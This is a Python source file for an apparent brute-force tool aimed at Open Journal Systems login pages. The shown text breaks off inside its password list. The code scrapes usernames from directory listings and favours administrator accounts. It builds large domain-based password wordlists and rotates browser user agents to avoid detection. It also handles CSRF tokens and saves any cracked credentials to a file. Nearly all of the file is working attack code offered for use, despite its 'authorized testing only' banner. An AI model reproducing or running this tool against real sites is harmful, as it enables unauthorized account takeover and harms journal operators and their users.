import requests
from bs4 import BeautifulSoup
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import signal
import random

class Colors:
    RESET = '\033[0m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    GRAY = '\033[90m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

BANNER = f"""{Colors.YELLOW}{Colors.BOLD}
OJS Brute Force Tool v1.0 by @wongalus7
For Authorized Security Testing Only
{Colors.RESET}"""

DISCLAIMER = f"""{Colors.RED}{Colors.BOLD}
LEGAL DISCLAIMER: This tool is for authorized security testing only. 
Unauthorized use is illegal and unethical. Use at your own risk.
{Colors.RESET}"""

def print_banner():
    print(BANNER)
    print(DISCLAIMER)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 12; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:123.0) Gecko/123.0 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/123.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/124.0.0.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "curl/8.4.0",
    "Wget/1.21.4",
]

user_agent_counter = 0
user_agent_lock = threading.Lock()

def get_next_user_agent():
    global user_agent_counter
    with user_agent_lock:
        user_agent = USER_AGENTS[user_agent_counter % len(USER_AGENTS)]
        user_agent_counter += 1
        return user_agent

def extract_domain_from_url(url):
    if '://' in url:
        protocol_split = url.split('://', 1)
        protocol = protocol_split[0]
        rest = protocol_split[1]
        if '/' in rest:
            host_path = rest.split('/', 1)
            host = host_path[0]
            return host
    return url

def extract_domain_name(domain):
    if domain.startswith('www.'):
        domain = domain[4:]
    
    parts = domain.split('.')
    
    if len(parts) == 2:
        return parts[0].lower()
    else:
        return ''.join(parts[:-2]).lower() if len(parts) > 2 else parts[0].lower()

def generate_always_generate_list(login_url):
    domain = extract_domain_from_url(login_url)
    domain_name = extract_domain_name(domain)
    
    always_generate = ["admin", "administrator", "root", "pass", "password", "ojs", "jurnal", "journal", "adminjurnal", "adminjournal", "adminojs", "ojsadmin", "Admin", "Administrator", "Root", "Pass", "Password", "Ojs", "Jurnal", "Journal", "Adminjurnal", "Adminjournal", "Adminojs", "Ojsadmin"]
    
    if domain_name:
        always_generate.extend([
            domain_name,
            domain_name.capitalize(),
            domain_name.upper(),
            f"{domain_name}admin",
            f"{domain_name}Admin",
            f"{domain_name}ADMIN",
            f"admin{domain_name}",
            f"Admin{domain_name}",
            f"ADMIN{domain_name}",
            f"{domain_name}jurnal",
            f"{domain_name}Jurnal",
            f"{domain_name}journal",
            f"{domain_name}Journal",
            f"{domain_name}ojs",
            f"{domain_name}OJS"
        ])
    
    if "." in domain and domain.count(".") >= 2:
        parts = domain.split(".")
        if len(parts) >= 3:
            if len(parts) >= 3:
                always_generate.extend([parts[0], parts[0].capitalize(), parts[0].upper()])
    
    return list(set(always_generate))

def generate_custom_wordlist(base_words, always_generate_list):
    variants = []
    suffixes = ["", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "11", "12", "22", "23", "33", "34", "44", "45", "55", "56", "66", "67", "77", "78", "88", "89", "90", "99", "111", "123", "222", "234", "333", "345", "444", "456", "555", "567", "666", "678", "777", "789", "888", "890", "999", "1111", "1234", "1945", "1980", "1981", "1982", "1983", "1984", "1985", "1986", "1987", "1988", "1989", "1990", "1991", "1992", "1993", "1994", "1995", "1996", "1997", "1998", "1999", "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009", "2010", "2011", "2012", "2013", "2014", "2015", "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2222", "2345", "3333", "3456", "4444", "4567", "5555", "5678", "6666", "6789", "7777", "7890", "8888", "9999", "11111", "12345", "22222", "23456", "33333", "34567", "44444", "45678", "55555", "56789", "66666", "67890", "77777", "88888", "99999", "111111", "123456", "222222", "234567", "333333", "345678", "444444", "456789", "555555", "567890", "666666", "777777", "888888", "999999", "1111111", "1234567", "2222222", "2345678", "3333333", "3456789", "4444444", "4567890", "5555555", "6666666", "7777777", "8888888", "9999999", "11111111", "12345678", "22222222", "23456789", "33333333", "34567890", "44444444", "55555555", "66666666", "77777777", "88888888", "99999999", "111111111", "123456789", "222222222", "234567890", "333333333", "444444444", "555555555", "666666666", "777777777", "888888888", "999999999", "1111111111", "1234567890", "2222222222", "3333333333", "00", "000", "0000", "00000", "000000", "0000000", "00000000", "000000000", "0000000000", "4444444444", "5555555555", "6666666666", "7777777777", "8888888888", "9999999999", "09", "098", "0987", "09876", "098765", "0987654", "09876543", "098765432", "0987654321", "01"]
    symbols = ["", "!", "@", "#", "$", "%", "&", "?", "~"]

    for base_word in base_words:
        for symbol in symbols:
            for suffix in suffixes:
                variants.append(f"{base_word}{symbol}{suffix}")
                variants.append(f"{base_word}{suffix}{symbol}")
        
        for keyword in always_generate_list:
            for symbol in symbols:
                for suffix in suffixes:
                    variants.append(f"{keyword}{symbol}{suffix}")
                    variants.append(f"{keyword}{suffix}{symbol}")
    
    for keyword in always_generate_list:
        variants.append(keyword)
        for symbol in symbols:
            for suffix in suffixes:
                variants.append(f"{keyword}{symbol}{suffix}")
                variants.append(f"{keyword}{suffix}{symbol}")

    return variants

def extract_usernames(url):
    try:
        user_agent = get_next_user_agent()
        response = requests.get(url.rstrip(), headers={"User-Agent": user_agent}, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            usernames = []
            for link in links:
                href = link['href'].rstrip('/')
                if href and not href.endswith(('.', '..')) and href != '':
                    basename = href.split('/')[-1]
                    if basename and not basename.startswith('.') and basename != 'site':
                        if not basename.startswith('?'):
                            if len(basename) > 1 and not basename.isdigit():
                                usernames.append(basename)
            return list(set(usernames))
        else:
            print(f"{Colors.RED}{Colors.BOLD}Failed to retrieve directory listing. Status code: {response.status_code}{Colors.RESET}")
            return []
    except Exception as e:
        print(f"{Colors.GRAY}{Colors.BOLD}Error extracting usernames: {e}{Colors.RESET}")
        return []

def get_csrf_token_and_action(login_url):
    try:
        user_agent = get_next_user_agent()
        response = requests.get(login_url.rstrip(), headers={"User-Agent": user_agent}, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            form = soup.find('form', {'id': 'login'})
            
            if not form:
                forms = soup.find_all('form')
                for f in forms:
                    if f.find('input', {'name': 'username'}) and f.find('input', {'name': 'password'}):
                        form = f
                        break
            
            if not form:
                forms = soup.find_all('form')
                for f in forms:
                    inputs = f.find_all('input')
                    has_username = any(inp.get('name') == 'username' for inp in inputs)
                    has_password = any(inp.get('name') == 'password' for inp in inputs)
                    if has_username and has_password:
                        form = f
                        break
            
            if form:
                action_url = form.get('action', '')
                csrf_input = form.find('input', {'name': 'csrfToken'})
                csrf_token = csrf_input.get('value') if csrf_input else None
                
                if not csrf_token:
                    form_inputs = form.find_all('input')
                    csrf_found = any(inp.get('name') == 'csrfToken' for inp in form_inputs)
                    if not csrf_found:
                        print(f"{Colors.YELLOW}Form OJS lama terdeteksi - tidak menggunakan CSRF token{Colors.RESET}")
                
                if not action_url:
                    action_url = login_url.rstrip()
                
                return action_url, csrf_token
        print(f"{Colors.RED}{Colors.BOLD}Failed to retrieve CSRF token and action URL. Status code: {response.status_code}{Colors.RESET}")
        return None, None
    except Exception as e:
        print(f"{Colors.RED}{Colors.BOLD}Error getting CSRF token: {e}{Colors.RESET}")
        return None, None

def check_login_success(response_text):
    error_patterns = [
        r'<div class="pkp_form_error">',
        r'<div class="alert alert-danger" role="alert">',
        r'<div class="error">',
        r'Invalid username or password',
        r'Login failed'
    ]
    for pattern in error_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return False
    success_patterns = [
        r'<div class="success">',
        r'Welcome',
        r'logout',
        r'account dashboard',
        r'my account'
    ]
    for pattern in success_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

def brute_force_worker(username, passwords, action_url, csrf_token, results, lock, login_url):
    for password in passwords:
        try:
            user_agent = get_next_user_agent()
            print(f"{Colors.YELLOW}{Colors.BOLD}[{username}] Trying password: {password}{Colors.RESET}")
            
            login_data = {
                'username': username,
                'password': password,
                'remember': 1
            }
            
            if csrf_token:
                login_data['csrfToken'] = csrf_token

            response = requests.post(
                action_url.rstrip(),
                data=login_data,
                headers={"User-Agent": user_agent},
                timeout=10
            )

            if check_login_success(response.text):
                result = f"{Colors.GREEN}[SUCCESS] Username: {username} | Password: {password}{Colors.RESET}"
                print(result)
                
                with lock:
                    with open("ojs_ok.txt", "a") as f:
                        f.write(f"Username: {username} | Password: {password} | Login URL: {login_url}\n")
                
                results.append((username, password, login_url))
                return True
            else:
                print(f"{Colors.RED}[FAILED] Username: {username} | Password: {password}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Request error for {username}/{password}: {e}{Colors.RESET}")
            continue
    return False

def input_with_timeout(prompt, timeout=10):
    def timeout_handler(signum, frame):
        raise TimeoutError("Input timed out")
    
    old_handler = signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    
    try:
        result = input(prompt)
        signal.alarm(0)
        return result
    except TimeoutError:
        print(f"\n{Colors.YELLOW}Timeout reached. Continuing with next username...{Colors.RESET}")
        return None
    finally:
        signal.signal(signal.SIGALRM, old_handler)

def extract_base_url(login_url):
    if '://' in login_url:
        protocol_split = login_url.split('://', 1)
        protocol = protocol_split[0]
        rest = protocol_split[1]
        if '/' in rest:
            host_path = rest.split('/', 1)
            host = host_path[0]
            return f"{protocol}://{host}"
    return login_url

def prioritize_admin_usernames(usernames):
    admin_keywords = ["admin", "mimin", "atmin", "min", "jurnal", "adminojs", "adminjurnal", "adminjournal", "root", "superuser", "administrator", "ojs", "journal"]
    
    admin_usernames = []
    regular_usernames = []
    
    for username in usernames:
        has_admin_keyword = any(keyword in username.lower() for keyword in admin_keywords)
        if has_admin_keyword:
            admin_usernames.append(username)
        else:
            regular_usernames.append(username)
    
    return admin_usernames + regular_usernames

def generate_indonesian_passwords():
    indonesian_passwords = [
        "0", "1", "11", "12", "111", "123", "321", "666", "1111", "1212", "1224", "1234", "1999", "4321", "4444", "5555", "10203", "11111", "12345", "33333", "44197", "54321", "55555", "88888", "100200", "101010", "102030", "111111", "111222", "112233", "121121", "121212", "121314", "123000", "123123", "123321", "123456", "123465", "123654", "123789", "131313", "141414", "142536", "147147", "147258", "147852", "159357", "159753", "212121", "212224", "222222", "225588", "232323", "357159", "444444", "454545", "456123", "456789", "456852", "456987", "555555", "654321", "666666", "753951", "777777", "789456", "789789", "888888", "909090", "987654", "999999", "1111111", "1234561", "1234567", "5201314", "7654321", "7758521", "7777777", "8812345", "10203040", "11111111", "11112222", "11223311", "11223344", "12121212", "12341234", "12344321", "12345678", "20232023", "31415926", "77777777", "87654321", "88888888", "123123123", "123456789", "123654789", "147258369", "147852369", "520520520", "741852963", "789456123", "963852741", "987654321", "999999999", "1029384756", "1098765432", "1111111111", "1122334455", "1234554321", "1234567890", "1234567891", "2222222222", "3333333333", "password", "qwerty", "admin", "password1", "password12", "password123", "password1234", "password12345", "pass$1234", "Password889", "Passwword", "admin123", "admin123456", "root", "12345678910", "123456789123456", "1234567890123456", "12345678901234567890", "admin1234", "admin12345", "ojs123", "ojs1234", "ojs12345", "ojs123456", "jurnal123", "jurnal1234", "jurnal12345", "jurnal123456", "journal123", "journal1234", "journal12345", "journal123456", "mimin123", "mimin1234", "mimin12345", "mimin123456", "atmin123", "atmin1234", "atmin12345", "atmin123456", "min123", "min1234", "min12345", "min123456", "0123456789", "0987654321", "4444444444", "5555555555", "6666666666", "7777777777", "8888888888", "9999999999", "123456789012345", "1234567890123456789", "admin123456789", "admin1234567890", "password123456", "password123456789", "password1234567890", "p@ssw0rd", "P@ssw0rd", "p4ssword", "P4ssword", "p4ssw0rd", "P4ssw0rd", "p4ssw0rd!", "P4ssw0rd!", "passw0rd", "passw0rd!", "Passw0rd!", "Passw@rd", "Passw@rd!", "passw@rd", "p@ssw0rd!", "P@ssw0rd!", "p@55w0rd", "P@55w0rd", "p@55w0rd!", "P@55w0rd!", "guest123", "web@1234", "p$55w0rd", "p$wd12345678", "p:3389", "p?ssword", "p@$$", "p@$$@w0rd1", "p@$$1", "p@$$12", "p@$$123", "p@$$123456", "p@$$vord", "p@$$vord1", "p@$$vord123", "p@$$vord1235", "p@$$vv0rd", "p@$$w0rd", "p@$$w0rd!", "p@$$w0rd!!!", "p@$$w0rd!@#", "p@$$w0rd.1234", "p@$$w0rd1", "p@$$w0rd123", "p@$$w0rd3edc", "p@$$w0rd43213", "p@$$word", "p@$$word0123", "p@$$word1", "p@$$word12", "p@$$word123", "p@$sw0rd", "p@$sword!", "p@$sword1", "p@$vvord", "p@%%w0rd123", "p@%%word", "p@??w0rd!@#", "p@@ssw0rd", "p@@ssw0rd1", "p@12", "p@1234", "p@33word", "p@55", "p@551", "p@5512", "p@55123", "p@55w0rd1", "p@55w0rd123", "p@55word", "p@55word1", "p@55word123", "p@5sw0rd", "p@5sw0rd123", "p@5sword", "p@5sword123", "p@r0la", "p@s$w0rd", "p@s$word!", "p@s$word#", "p@s$word@", "p@s5w0rd", "p@s5w0rd123", "p@s5word", "p@s5word123", "p@ss", "p@ss@word123", "p@ss`word", "p@ss0123", "p@ss1", "p@ss123", "p@ss1234", "p@ss12345", "p@ss123456", "p@ss1word", "p@ssw)rd", "p@ssw0rd!@", "p@ssw0rd!@#", "p@ssw0rd!@#$", "p@ssw0rd!@#123", "p@ssw0rd!12", "p@ssw0rd!123", "p@ssw0rd.", "p@ssw0rd.123", "p@ssw0rd.change", "p@ssw0rd@", "p@ssw0rd@1", "p@ssw0rd@123", "p@ssw0rd@321", "p@ssw0rd_12345", "p@ssw0rd~", "p@ssw0rd+", "p@ssw0rd001", "p@ssw0rd0123", "p@ssw0rd03", "p@ssw0rd1", "p@ssw0rd10", "p@ssw0rd123", "p@ssw0rd123!@#", "p@ssw0rd1234", "p@ssw0rd123456", "p@ssw0rd123456789", "p@ssw0rd15", "p@ssw0rd2021", "p@ssw0rd2022", "p@ssw0rd2023", "p@ssw0rd23", "p@ssw0rd3", "p@ssw0rd321", "p@ssw0rd4", "p@ssw0rd5", "p@ssw0rd58", "p@ssw0rd6", "p@ssw0rd7", "p@ssw0rd8", "p@ssw0rd89", "p@ssw0rdp@ssw0rd", "p@ssw0rdqwe", "p@ssw0rds", "p@ssw0rdvps123", "p@ssw0rt@1", "p@ssw0rt@12", "p@ssw0rt@123", "p@ssw0rt@1234", "p@ssw0rt1", "p@ssw0rt1@", "p@ssw0rt12", "p@ssw0rt12@", "p@ssw0rt123", "p@ssw0rt123@", "p@ssw0rt1234", "p@ssw0rt1234@", "p@ssw1rd", "p@ssword", "p@ssword.2011", "p@ssword@", "p@ssword@123", "p@ssword_2002", "p@ssword00", "p@ssword000000", "p@ssword01", "p@ssword010", "p@ssword0123", "p@ssword1", "p@ssword10", "p@ssword11", "p@ssword12", "p@ssword123", "p@ssword-123", "p@ssword123!", "p@ssword1234", "p@ssword12345", "p@ssword123456", "p@ssword123456789", "p@ssword13", "p@ssword14", "p@ssword15", "p@ssword2", "p@ssword2021", "p@ssword2022", "p@ssword2023", "p@ssword55", "p@ssword8888", "p@ssword99", "p@svord", "p@svvord", "p@sword", "p@wss0rd", "p@ypal", "p_assword", "p_word", "p4$$w0rd", "p455w0rd", "p455word", "p4ssword22", "pa$$", "pa$$0rd", "pa$$1", "pa$$123", "pa$$1234", "pa$$4152", "pa$$s0rd!@#", "pa$$vord", "pa$$w0r", "pa$$w0rd", "pa$$w0rd!", "pa$$w0rd.7", "pa$$w0rd@", "pa$$w0rd@123", "pa$$w0rd01", "pa$$w0rd1", "pa$$w0rd1!", "pa$$w0rd123!@#", "pa$$w0rd123456", "pa$$w0rd666", "pa$$wd", "pa$$word", "pa$$word1", "pa$$word123", "pa$$word2", "pa55", "pa55w0rd", "pa55w0rd!", "pa55w0rd!@#$", "pa55w0rd@12345", "pa55w0rd11", "pa55word", "pacific", "pan5201314", "panther", "pass", "pass!@#", "pass!w0rd", "pass!word", "pass.123!", "pass@!#", "pass@123", "pass@1234", "pass@123456", "pass@2014", "pass@2015", "pass@word", "pass@word1", "pass@word10", "pass@word123", "pass_hash", "pass_w", "pass_word", "pass0123", "pass1", "pass12", "pass123", "pass-123", "pass1234", "pass12345", "pass123456", "pass123word", "pass1word", "pass2000", "pass2013", "pass2016", "pass4word", "passa", "passe", "passe123", "passer", "passkey", "passvvord@123", "passw", "passw0r", "passw0rd!@#", "passw0rd#@!", "passw0rd.", "passw0rd@1", "passw0rd~", "passw0rd0", "passw0rd01", "passw0rd0123", "passw0rd1", "passw0rd1!", "passw0rd123", "passw0rd123456", "passw0rd147", "passw0rd181.", "passw0rd2021", "passw0rd2022", "passw0rd33", "passw0rd4", "passw0rd5", "passw0rt@1", "passw0rt@12", "passw0rt@123", "passw0rt@1234", "passw0rt1", "passw0rt1@", "passw0rt12", "passw0rt12@", "passw0rt123", "passw0rt123@", "passw0rt1234", "passw0rt1234@", "passw2rd", "passwd", "password!", "password!!", "password!!@@##", "password!@#", "password!@#$", "password!@#$%", "password!@#$%^&*(", "password!1", "password!123", "password!23", "password#", "password$", "password$1", "password*", "password*1", "password*123", "password.", "password..", "password.1", "password.123", "password.1234", "password.2014", "password?", "password@", "password@!", "password@!@", "password@!@#", "password@1", "password@11", "password@123", "password@123123", "password@123321", "password@1234", "password@12345", "password@159", "password@2", "password@2021", "password@66", "password_1", "password_123", "password0", "password00", "password001", "password01", "password01!", "password01#", "password010", "password0123", "password02", "password06", "password07", "password08", "password09", "password-1", "password1!", "password1.", "password100", "password11", "password1212", "password-123", "password123!", "password123!@#", "password123*", "password123@", "password1234!", "password12345!", "password1234567", "password14", "password147", "password16", "password2", "password2021", "password2022", "password2023", "password21", "password22", "password258", "password3", "password321", "password369", "password4", "password5", "password77", "password83", "password88", "password888", "password99", "password999", "passwordabc", "passwordabc!@#", "passwordpassword", "passwords", "passwords5", "passwort", "passwort@1", "passwort@12", "passwort@123", "passwort@1234", "passwort1", "passwort1@", "passwort12", "passwort12@", "passwort123", "passwort123@", "passwort1234", "passwort1234@", "passwrd", "passwrod1234", "pasword", "adm!n!$trat0r", "adm!n_123", "adm!n001", "adm@2014", "adm1", "adm1n", "adm1n!", "adm1n123", "adm1n1str@t0r", "adm1n1strat0r", "adm1n2013", "adm1n2015", "adm1nistrateur2006", "adm2013", "admi", "admiadmin", "admin!!!", "admin!!!1", "admin!!!12", "admin!!!123", "admin!!!1234", "admin!@#$", "admin!@#$%", "admin!@#123", "admin!@#321", "admin!@#456&", "admin!1", "admin!2008", "admin!2015", "admin#", "admin####", "admin#01", "admin#123", "admin#147258", "admin#2008", "admin#2016", "admin$", "admin$000", "admin$11", "admin%tgb", "admin&ujm", "admin)1", "admin)12", "admin)123", "admin)1234", "admin)12345", "admin)123456", "admin)2008", "admin)2015", "admin)2016", "admin)2017", "admin*123654", "admin.01", "admin.123", "admin.2012", "admin.321456", "admin/123", "admin@", "admin@#123", "admin@1", "admin@11", "admin@12", "admin@123", "admin@1234", "admin@12345", "admin@123456", "admin@13", "admin@13!", "admin@13!@", "admin@1313", "admin@14", "admin@15", "admin@16", "admin@17", "admin@18", "admin@1980", "admin@2", "admin@2021", "admin@2022", "admin@2023", "admin@3", "admin@321", "admin@4", "admin@4321", "admin@5", "admin@77", "admin@777777", "admin@888", "admin@88888", "admin@admin", "admin@istrator", "admin@qwert!@#", "admin_123", "admin_1234", "admin_2012", "admin00", "admin000", "admin001", "admin002", "admin004", "admin005", "admin01", "admin07", "admin08", "admin1", "admin1!", "admin1$", "admin11", "admin112233", "admin12", "admin12!@", "admin12#", "admin121", "admin121!", "admin121!!@@", "admin121!@", "admin121!@##", "admin121!@#$", "admin121!@#$%", "admin121!@#$%^", "admin121!@@", "admin123!", "admin123!@", "admin123!@#", "admin123#@!", "admin123.", "admin123@#", "admin1234!", "admin1234?", "admin12345!", "admin12345.", "admin123456!", "admin123456#", "admin123qwe", "admin1313", "admin1qaz", "admin2", "admin2001", "admin2006", "admin2008", "admin2009", "admin2010", "admin2011", "admin2012", "admin2013", "admin2014", "admin2015", "admin2015@", "admin2016", "admin21", "admin3", "admin321", "admin3389", "admin5", "admin55", "admin555", "admin666", "admin777", "admin789", "admin8", "admin8520", "admin888", "admin888!@#", "admin9", "admin911", "adminadmin", "admini", "administrador", "administrat0r88", "administrator", "administrator.123456", "administrator@123", "administrator_2010", "administrator001", "administrator1", "administrator123", "adminpass", "adminpass1", "adminpass123", "adminpass123@!", "adminpass123@123", "adminpass1230", "adminpass123123", "adminpass1234", "adminpass12345", "adminpass147", "adminpass2", "adminpass3", "adminpass456", "adminpass789", "adminpassword1", "adminqwe123", "admins", "@admin1", "@admin123", "@bcd1234", "@dm!n", "@dm!n123", "@dm1n", "@dm1n1", "@dm1n132", "@dm1n1str@t0r", "@dm1n1str@tor", "@dm1n1strator", "@dm1n2016", "@dm1nistr@tor", "@dmin", "@dmin!2016", "@dmin@1234", "@dmin_11", "@dmin123", "@dmin1234", "@dmin123456", "@dmin2012", "@dmin2013", "@dmini$trat0r", "@dministrator1", "@Admin1", "@Admin123", "toor", "test", "Aa123456", "root123", "default", "abc123", "ubuntu", "1q2w3e4r", "eve", "1qaz@WSX", "qwe123", "1qaz2wsx", "root@123", "abcd1234", "raspberry", "changeme", "redhat", "root@2024", "guest", "rootroot", "server", "qwer1234", "000000", "alpine", "q1w2e3r4", "ubnt", "root1234", "1qazXSW@", "master", "welcome", "zaq12wsx", "!QAZ2wsx", "123.com", "Passw0rd", "1qaz!QAZ", "letmein", "qwerty123", "123qwe", "123qweasd", "system", "test123", "Password1", "cisco", "Aa12341234", "superuser", "1q2w3e", "sysadmin", "Password", "oracle", "alex", "calvin", "trustno1", "rootpass", "-", "a", "insecure", "123@abc", "rootadmin", "centos", "1qazxsw2", "apple", "asdf1234", "Aa123123", "zaq1xsw2", "root2023", "abc@123", "qwe123!@#", "123qwe!@#", "root123456", "rootme", "Huawei@123", "user", "support", "Admin@123", "qwertyuiop", "12qwaszx", "zxcvbnm", "Server123@", "public", "linux", "qweasdzxc", "1q2w3e4r5t", "power", "1234qwer", "2wsx3edc", "aa123456", "super", "samsung", "pfsense", "qweasd", "cisco123", "asdf", "root1", "dreambox", "r00t", "voyage", "!@", "1q2w3e4r5t6y", "huawei@123", "abc123!@#", "qazwsxedc", "huawei", "root00", 